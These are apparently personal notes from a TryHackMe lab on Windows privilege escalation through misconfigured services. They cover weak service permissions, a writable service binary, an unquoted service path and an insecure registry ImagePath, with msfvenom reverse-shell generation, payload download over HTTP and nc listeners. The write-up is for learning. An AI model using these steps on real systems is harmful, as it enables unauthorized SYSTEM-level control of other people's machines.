# Windows Privilege Escalation via Misconfigured Services | From User to System

## Room: TryHackMe

```jsx
https://tryhackme.com/room/windows10privesc
```

# Technique no 1

Windows services 

```jsx
sc query
```

In Powershell

```jsx
Get-CimInstance Win32_Service

=Filter=

Get-CimInstance Win32_Service | Where-Object PathName -notmatch 'windows' | Select-Object Name, PathName
Get-CimInstance Win32_Service | Where-Object PathName -notmatch 'windows' | Select-Object Name, PathName

```

![image.png](Windows%20Privilege%20Escalation%20via%20Misconfigured%20Ser/image.png)

# Transfering

## For Reverse shell Payload

```jsx
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f elf -o shell.elf

```

```jsx
python3 -m http.server 80

```

## Powershell

```jsx
wget http://ip/shell.exe -Outfile shell.exe
```

### Query Service Configuration

## sc= Service Command, query Configuration =qc

```jsx
sc qc daclsvc
```

![image.png](Windows%20Privilege%20Escalation%20via%20Misconfigured%20Ser/image%201.png)

## Modify Service BinPath

```jsx
sc config daclsvc binpath="C:\Users\user\shell.exe"
```

## Output

```jsx
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Users\user\shell.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

```

### Open nc

```jsx
nc -lvnp 4444
```

### Start Service

```jsx
sc start daclsvc
```

![image.png](Windows%20Privilege%20Escalation%20via%20Misconfigured%20Ser/image%202.png)

# Technique no 2

Insecure Service Executable 

```bash
C:\Users\user>sc qc filepermsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: filepermsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\File Permissions Service\filepermservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : File Permissions Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

```

Copy aand Overwrite at a time

```bash
C:\Users\user>copy shell.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
```

Open nc

```bash
nc -lvnp 4444
```

Start

```bash
sc start filepermsvc
```

# Technique no 3

Unquoted service Path

![image.png](Windows%20Privilege%20Escalation%20via%20Misconfigured%20Ser/image%203.png)

(Unquoted Service Path Analysis

```bash
C:\Program.exe
C:\Program Files\Unquoted.exe
C:\Program Files\Unquoted Path.exe
C:\Program Files\Unquoted Path Service\Common.exe
C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
```

```powershell
copy shell.exe C:\Program Files\Unquoted Path Service\Common.exe

```

# Technique no 4

Insecure Registry Service Permissions)

```powershell
C:\Users\user>reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\regsvc
    Type    REG_DWORD    0x10
    Start    REG_DWORD    0x3
    ErrorControl    REG_DWORD    0x1
    ImagePath    REG_EXPAND_SZ    "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
    DisplayName    REG_SZ    Insecure Registry Service
    ObjectName    REG_SZ    LocalSystem

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\regsvc\Security

C:\Users\user>

```

![image.png](Windows%20Privilege%20Escalation%20via%20Misconfigured%20Ser/image%204.png)

```powershell
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\user\shell.exe" /f

```

![image.png](Windows%20Privilege%20Escalation%20via%20Misconfigured%20Ser/image%205.png)

![image.png](Windows%20Privilege%20Escalation%20via%20Misconfigured%20Ser/image%206.png)

![image.png](Windows%20Privilege%20Escalation%20via%20Misconfigured%20Ser/image%207.png)